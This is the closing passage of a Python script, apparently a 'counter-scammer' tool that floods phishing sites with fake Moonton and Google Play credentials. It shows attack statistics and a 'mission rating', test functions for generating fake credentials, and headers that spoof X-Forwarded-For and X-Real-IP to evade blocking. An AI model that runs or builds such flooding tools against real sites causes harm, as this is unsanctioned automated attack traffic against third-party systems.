        print(f"⏱️  Total time: {total_stats['total_time']:.1f} seconds")
        print(f"🌐 Bandwidth used: {total_stats['total_bandwidth']/1024/1024:.2f} MB")
        
        # Mission rating
        if success_rate >= 90:
            rating = "🏆 LEGENDARY"
        elif success_rate >= 80:
            rating = "🥇 ELITE"
        elif success_rate >= 70:
            rating = "🥈 PROFESSIONAL"
        elif success_rate >= 60:
            rating = "🥉 COMPETENT"
        else:
            rating = "🔴 NEEDS IMPROVEMENT"
        
        print(f"🏅 Mission rating: {rating}")
        print(f"{'='*60}")
        
        # Cleanup
        scammer.close_sessions()
        
    except KeyboardInterrupt:
        print(f"\n\n🛑 ATTACK INTERRUPTED BY OPERATOR")
        print("🧹 Cleaning up resources...")
        scammer.close_sessions()
        print("✅ Cleanup complete.")
    except Exception as e:
        print(f"\n❌ SYSTEM ERROR: {e}")
        scammer.close_sessions()


def test_data_generation():
    """Test the improved data generation with new requirements."""
    scammer = CounterScammer()
    
    print("=== TESTING NEW DATA GENERATION ===\n")
    
    print("1. Testing Moonton data generation:")
    for i in range(3):
        moonton_data = scammer.generate_fake_data_by_type("moonton")
        print(f"\nRequest {i+1}:")
        print(f"   Email: {moonton_data['email']}")
        print(f"   Password: {moonton_data['password']}")
        print(f"   Pass: {moonton_data['pass']}")
        print(f"   Phone: {moonton_data['phone']}")
        print(f"   Server: {moonton_data['server']}")
        print(f"   Points: {moonton_data['points']}")
        print(f"   Password == Pass: {moonton_data['password'] == moonton_data['pass']}")
    
    print("\n" + "="*50)
    print("2. Testing Google Play data generation:")
    for i in range(2):
        google_data = scammer.generate_fake_data_by_type("google")
        print(f"\nRequest {i+1}:")
        print(f"   Email: {google_data['email']}")
        print(f"   Password: {google_data['password']}")
        print(f"   Pass: {google_data['pass']}")
        print(f"   Phone: {google_data['phone']}")
        print(f"   Server: {google_data['server']}")
        print(f"   Points: {google_data['points']}")
    
    print("\n" + "="*50)
    print("3. Testing phone number generation:")
    for i in range(10):
        phone = scammer.generate_fake_phone("0")
        print(f"   Phone {i+1}: {phone}")
    
    print("\n" + "="*50)
    print("4. Testing fake IP and User-Agent:")
    for i in range(3):
        headers = scammer.generate_random_headers()
        print(f"\nSet {i+1}:")
        print(f"   IP (X-Forwarded-For): {headers['X-Forwarded-For']}")
        print(f"   IP (X-Real-IP): {headers['X-Real-IP']}")
        print(f"   User-Agent: {headers['user-agent'][:100]}...")


# Add this function to the existing test functions section

if __name__ == "__main__":
    # Run interactive counter-attack
    interactive_counter_attack()